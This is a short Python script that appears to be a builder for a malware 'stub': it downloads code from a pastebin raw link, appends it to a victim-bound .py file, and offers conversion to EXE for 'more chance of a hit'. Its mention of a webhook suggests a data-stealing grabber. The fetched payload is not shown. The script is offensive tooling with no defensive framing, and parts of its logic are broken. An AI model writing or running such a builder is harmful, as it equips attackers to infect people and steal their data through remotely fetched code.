from re import A
import requests
import colorama
from colorama import Fore, Back, Style
from time import sleep
import os

colorama.init()

r = requests.get("https://pastebin.com/raw/dEz0B1Sq")

print(f"[{Fore.GREEN}+{Fore.WHITE}] Loading..{Fore.LIGHTMAGENTA_EX}")
sleep(1)
print(f"[{Fore.RED}!{Fore.WHITE}] P.S : DO NOT ENTER FILE EXTENSION, ONLY THE FILE NAME!{Fore.LIGHTMAGENTA_EX}")
stubnamer = input("[!] Please Re-Enter Stub Name : ")
print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Please Wait..{Fore.LIGHTMAGENTA_EX}")
sleep(3)
print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Writing Additonal Data..{Fore.LIGHTMAGENTA_EX}")

with open(stubnamer + ".py", "ab") as f:
    f.write(r.content)
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]  Successfull! {Fore.LIGHTMAGENTA_EX}")
    sleep(2)

py2exe = input("[!] Y/N, Do You Want To Convert File to EXE? (MORE CHANCE OF A HIT IF CONVERTED!) : ")

if py2exe == 'Y':
    os.startfile('py2exe.bat')
    print(f"{Fore.GREEN}[+] LOADED!")

if py2exe == 'N':
    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Quitting PY2EXE Window..{Fore.LIGHTMAGENTA_EX}")
    sleep(3)
    os.close('py2exe.bat')

else:

    print(f"{Fore.WHITE} [{Fore.RED}*{Fore.WHITE}] ERROR! Please Try Again But Use A Capital 'Y' Or 'N' If You Didn't Previously. If Your WebHook Didn't Work, Try Again Or Make A New One.{Fore.CYAN}")